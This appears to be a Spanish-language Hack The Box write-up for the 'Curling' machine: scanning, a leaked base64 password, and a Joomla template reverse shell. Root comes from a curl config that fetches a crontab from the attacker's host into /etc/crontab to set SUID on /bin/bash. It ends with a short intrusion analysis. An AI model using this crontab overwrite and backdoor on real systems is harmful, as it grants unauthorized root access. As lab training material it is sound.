# Curling ![Avatar](https://www.hackthebox.eu/storage/avatars/50cbb1d2e9b638140641af95a7582ef6_thumb.png)

## Initial Scan
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home
```
## Enum
### HTTP
Mirando en el fuente de la landing page vemos lo siguiente
```html
      <!-- secret.txt -->
```
Veamos que en ese archivo hay una string
```
Q3VybGluZzIwMTgh
```
Si lo decodificamos como base64 vemos que es este string
```
Curling2018!
```
Parece una contraseña, probemos usuarios comunes y esa password a ver si hay suerte, en principio nada, mirando mas a fondo vemos que hay un post firmado por Floris , con esto podemos logearnos en el servicio
#### Joomscan
Joomscan reporta que la version es
```
[+] Detecting Joomla Version
[++] Joomla 3.8.8
```
Buscando vulns de la version encontramos un RCE y un LFI
```
RCE: CVE-2018-17856
LFI: CVE-2019-10945
```
No encontre información sobre como explotar el RCE, pero editando la template activa podemos obtener una rev shell sin mucho problmea, para ello:
* 1. Nos logueamos desde el login de /administrator
* 2. Vamos a la pestaña de Templates
* 3. Editamos la template activa
* 4. Añadimos al codigo una reverse shell
* 5. Enjoy

Una vez tenemos shell como www-data podemos ver un archivo llamado password backup en el /home de floris,si lo miramos vemos que es un hexdump de algo, vamos a cyberchef y hacemos la siguiente receta
```
From_Hexdump()
Bzip2_Decompress(false)
Gunzip()
Bzip2_Decompress(false)
Untar()
``` 

Y vemos el siguiente stream
```
5d<wdCbdZu)|hChXll
```
Con esa contraseña podemos logearnos como floris

## Privesc 
Podemos ver el siguiente trabajo en segundo plano
```
root     21763  0.0  0.0   4628   836 ?        Ss   14:08   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
root     21765  0.0  0.4 105360  9020 ?        S    14:08   0:01 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
```
Si miramos el parametro -K podemos ver que lo que hace es coger un archivo de configuracion, en este caso con una URL, si cambiamos esa URL a la nuestra y añadimos un parametro output tal que asi:
```
url = "http://IPproia/crontab"
output = "/etc/crontab"
```
Y en local creamos un crontab con la siguiente tarea (o otra similar como una rev shell o lo que sea)
```
* * * * *   root chmod +s /bin/bash 
```
Con esto cuando se ejecute la tarea, y se ejecute la del crontab tendremos nuestra backdoor

# Analisís de la intrusion
### Sensible data leak
Las credenciales de acceso a Joomla estan expuestas en el blog Joomla, lo que nos permitio compromenterlo
### Vulnerable joomla version
La versión de joomla nos permite subir una reverse shell a las templates, cosa que aprovechamos para obtener una shell
### Pasword_backup
El usuario floris tiene un backup accesible por www-data de su contrasña, el acceso a www-data nos permitio gracias a esto acceder a floris
### Vuln cronjob
Existe un trabajo programado para el root del que pudimos abusar ya que coge parametros de un archivo que floris podia editar
